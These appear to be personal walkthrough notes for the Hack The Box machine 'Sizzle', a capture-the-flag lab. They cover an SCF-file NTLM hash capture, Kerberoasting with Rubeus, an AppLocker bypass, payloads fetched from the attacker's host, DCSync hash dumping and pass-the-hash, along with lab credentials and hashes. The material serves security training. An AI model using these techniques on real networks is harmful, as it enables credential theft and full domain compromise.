# https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
### No empty lines
https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html#smb---tcp-445

```bash
cat * | xxd | grep -v "0000 0000 0000 0000 0000 0000 0000 0000"
```

### smbcacls on mount
```bash
smbcacls -N '//10.129.230.198/Department Shares' Users

# mount it
sudo mount -t cifs //10.129.230.198/Department\ Shares /mnt

for i in $(ls); do echo $i; smbcacls -N '//10.129.230.198/Department Shares' $i; done
```

```bash
❯ smbcacls -N '//10.129.230.198/Department Shares' Users/Public
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP:HTB\Domain Users
ACL:Everyone:ALLOWED/OI|CI/FULL # <--- write permissions for unauthenticated users then it is possible to obtain passwords hashes of domain users or shells
```

### SMB Share – SCF File Attacks
https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/

```text
[Shell]
Command=2
IconFile=\\10.10.17.120\alvin.ico
[Taskbar]
Command=ToggleDesktop
```

```bash
sudo responder -I tun0 -v
```

Grab the hash and crack it to get credentials

### /certsrv/ (Status: 401); feroxbuster won't miss it by default
```bash
gobuster -k -u https://10.10.10.103 -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -t 20 -s 200,204,301,302,307,403,401
```

AMANDA:Ashare1972

### Sign CSR for winrm
##### One way..
```bash
openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
```
##### ..or the other since `.crt` and `.cer` are interchangeable
https://github.com/A1vinSmith/OSCP-PWK/wiki/Crack-Hash
```bash
openssl genrsa -aes256 -out enox.key 2048
openssl req -new -key enox.key -out enox.csr

evil-winrm -i 10.129.230.198 -S -c enox.cer -k enox.key
```

# Foothold
### Lateral movement amanda -> mrlky
*Evil-WinRM* PS C:\Users\amanda\Desktop> dir
*Evil-WinRM* PS C:\Users\amanda\Desktop> netstat -ap tcp

### Kerberoasting as port 88 didn't show up in nmap
##### domain htb.local from nmap scan
```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py htb.local/amanda:Ashare1972 -request -dc-ip $IP
```
it failed as it requires the pivoting first.
### Blocked
`certutil -urlcache -f http://10.10.16.9/chisel chisel`

### Bypass AppBlocker
```bash
IWR http://10.10.16.9/chisel -OutFile chisel.exe
chisel server -p 8008 --reverse
.\chisel.exe client 10.10.16.9:8008 R:88:127.0.0.1:88 R:389:localhost:389
```

### Try it from windows with mimikatz, powerview or Rubeus
evil-winrm upload failed
```
*Evil-WinRM* PS C:\windows\temp> upload /home/alvin/Downloads/Binaries/Rubeus.exe 
Info: Uploading /home/alvin/Downloads/Binaries/Rubeus.exe to C:\windows\temp\Rubeus.exe
```

Try IWR insteadchisel
`IWR http://10.10.16.13/Rubeus.exe -OutFile Rubeus.exe`
*Evil-WinRM* PS C:\Users\amanda> IWR http://10.10.16.13/Rubeus.exe -OutFile Rubeus.exe

##### Rubeus with creds
```
.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
```
Program 'Rubeus.exe' failed to run: This program is blocked by group policy.

##### Tricky thing here. Have to use `windows\temp` that AppLocaker isn't restricing even you can't run `dir` to check what's in there.
```
*Evil-WinRM* PS C:\windows\temp> .\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /nowrap
.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
```

### Crack hash
`hashcat -m 13100 --force -a 0 hash /usr/share/wordlists/rockyou.txt`
mrlky:Football#7

##### Sign csr for mrlky again
Football#7
```bash
openssl req -newkey rsa:2048 -nodes -keyout mrlky.key -out mrlky.csr

evil-winrm -i $IP -S -k mrlky.key -c certnew.cer
```

# Privilege Escalation
### Enum with bloodhound or powerview
Look into the Outbound Object Control. mrlky has the DS-Replication-Get-Changes-All(GetChangesAll) privilege.

### DCSync
##### linux doesn't require pivoting here since it's not Kerberoasting in 88
```bash
❯ impacket-secretsdump -just-dc mrlky:Football#7@$IP

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
```

##### check that hash's ablity using crackmapexec
`crackmapexec winrm $IP -u administrator -H f6b7160bfc91823792e0ac3a162c9267`
```
❯ crackmapexec smb $IP -u administrator -H f6b7160bfc91823792e0ac3a162c9267
SMB         10.129.114.166  445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.114.166  445    SIZZLE           [+] HTB.LOCAL\administrator:f6b7160bfc91823792e0ac3a162c9267 (Pwn3d!)
```
```
❯ crackmapexec winrm $IP -u administrator -H f6b7160bfc91823792e0ac3a162c9267
SMB         10.129.114.166  5986   SIZZLE           [*] Windows 10.0 Build 14393 (name:SIZZLE) (domain:HTB.LOCAL)
HTTP        10.129.114.166  5986   SIZZLE           [*] https://10.129.114.166:5986/wsman
WINRM       10.129.114.166  5986   SIZZLE           [-] HTB.LOCAL\administrator:f6b7160bfc91823792e0ac3a162c9267 "The server did not response with one of the following authentication methods Negotiate, Kerberos, NTLM - actual: ''"
```
The evil-winrm won't work here. Need alternatives instead.
Impacket psexec.py should work, but it doesn't.

##### Root
```bash
evil-winrm -i $IP -u Administrator -H f6b7160bfc91823792e0ac3a162c9267
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes :f6b7160bfc91823792e0ac3a162c9267 Administrator@$IP
```